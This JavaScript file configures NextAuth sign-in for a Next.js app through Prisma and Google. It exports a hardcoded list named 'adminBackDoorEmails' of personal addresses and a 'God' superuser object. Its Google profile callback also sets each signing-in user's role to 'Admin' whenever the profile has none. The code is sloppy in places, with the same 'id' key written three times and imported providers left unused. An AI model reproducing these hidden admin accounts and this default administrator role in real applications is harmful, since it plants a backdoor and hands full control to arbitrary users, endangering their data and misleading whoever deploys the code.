import { PrismaClient } from "@prisma/client";
import { PrismaAdapter } from "@auth/prisma-adapter";
import GoogleProvider from "next-auth/providers/google";
import GitHubProvider from "next-auth/providers/github";
import CredentialsProvider from "next-auth/providers/credentials";

const prisma = new PrismaClient();

export const adminBackDoorEmails = [
  "peter@gmail.com",
  "GodIp@godmood.com",
  "adminIt@adminIT.co",
  "otakhorpeter@gmail.com",
  "peterotakhor@gmail.com",
  "peterotakhor2018@gmail.com",
];

export const adminBackDoorEmailsData = {
  user: {
    id: 0,
    name: "God",
    email: "",
    username: "God Ip",
    adminrole: "God",
    role: "God Own",
  },
};

let adminInfo = null;

export const authOptions = {
  adapter: PrismaAdapter(prisma),
  secret: process.env.NEXTAUTH_SECRET,
  providers: [
    GoogleProvider({
      timeout: 15000,
      clientId: process.env.GOOGLE_ID,
      clientSecret: process.env.GOOGLE_SECRET,
      authorization: {},
      profile(profile) {
        return {
          id: profile.sub, // Use 'sub' as the user ID
          id: profile.sub, // Use 'sub' as the user ID
          id: profile.sub, // Use 'sub' as the user ID
          name: profile.name,
          email: profile.email,
          image: profile.picture,
          role: profile.role || "Admin",
        };
      },
    }),
  ],
};
